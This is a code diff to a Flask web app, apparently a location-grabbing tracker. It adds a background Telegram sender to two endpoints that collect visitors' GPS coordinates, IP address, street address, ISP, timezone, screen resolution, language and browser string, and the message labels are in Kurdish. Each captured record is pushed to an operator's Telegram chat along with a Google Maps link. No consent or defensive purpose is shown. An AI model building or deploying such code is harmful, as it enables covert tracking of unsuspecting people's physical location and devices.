@@ -10,6 +10,10 @@ from psycopg2.extras import RealDictCursor
 
 app = Flask(__name__)
 
+# Telegram config (set in Railway environment)
+TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+
 # Database connection setup
 DATABASE_URL = os.environ.get('DATABASE_URL')  # Expected to be set in Railway environment
 
@@ -32,6 +36,24 @@ if conn:
                 data JSONB NOT NULL
             );
         ''')
+
+# Send message to Telegram in a background thread
+def send_telegram(text: str):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    def _send():
+        try:
+            url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
+            requests.post(url, json={
+                'chat_id': TELEGRAM_CHAT_ID,
+                'text': text,
+                'parse_mode': 'HTML',
+                'disable_web_page_preview': True
+            }, timeout=10)
+        except Exception as e:
+            print(f'Telegram error: {e}')
+    threading.Thread(target=_send, daemon=True).start()
+
 
 # Global lock and timestamp for rate limiting Nominatim API
 nominatim_lock = threading.Lock()
@@ -105,6 +127,19 @@ def collect():
         'timestamp': datetime.utcnow().isoformat() + 'Z'
     }
     log_data(log_entry)
+
+    maps_link = f'https://maps.google.com/?q={latitude},{longitude}'
+    msg = (
+        f'📍 <b>موقعیت GPS گیرا</b>\n'
+        f'━━━━━━━━━━━━━━━━━━━\n'
+        f'🌐 <b>IP:</b> <code>{client_ip}</code>\n'
+        f'📌 <b>کووردینات:</b> <code>{latitude}, {longitude}</code>\n'
+        f'🏠 <b>ناونیشان:</b> {address}\n'
+        f'🗺 <b>Google Maps:</b> <a href="{maps_link}">{maps_link}</a>\n'
+        f'🕐 <b>کات:</b> {log_entry["timestamp"]}'
+    )
+    send_telegram(msg)
+
     return jsonify({'status': 'success'})
 
 
@@ -132,6 +167,33 @@ def collect_fallback():
         'timestamp': datetime.utcnow().isoformat() + 'Z'
     }
     log_data(log_entry)
+
+    city = ipinfo_data.get('city', 'Unknown')
+    region = ipinfo_data.get('region', '')
+    country = ipinfo_data.get('country', '')
+    org = ipinfo_data.get('org', 'Unknown')
+    loc = ipinfo_data.get('loc', '')
+    maps_link = f'https://maps.google.com/?q={loc}' if loc else ''
+    ua = data.get('userAgent', 'Unknown')
+    tz = data.get('timezone', 'Unknown')
+    screen = data.get('screenResolution', 'Unknown')
+    lang = data.get('language', 'Unknown')
+
+    msg = (
+        f'📡 <b>داتا بێ GPS گیرا (Fallback)</b>\n'
+        f'━━━━━━━━━━━━━━━━━━━\n'
+        f'🌐 <b>IP:</b> <code>{client_ip}</code>\n'
+        f'🏙 <b>شار:</b> {city}, {region}, {country}\n'
+        f'🏢 <b>ISP:</b> {org}\n'
+        f'⏰ <b>Zone:</b> {tz}\n'
+        f'🖥 <b>Screen:</b> {screen}\n'
+        f'🌍 <b>زمان:</b> {lang}\n'
+        + (f'🗺 <b>Google Maps:</b> <a href="{maps_link}">{maps_link}</a>\n' if maps_link else '')
+        + f'📱 <b>Browser:</b> <code>{ua[:200]}</code>\n'
+        f'🕐 <b>کات:</b> {log_entry["timestamp"]}'
+    )
+    send_telegram(msg)
+
     return jsonify({'status': 'success'})
 
 
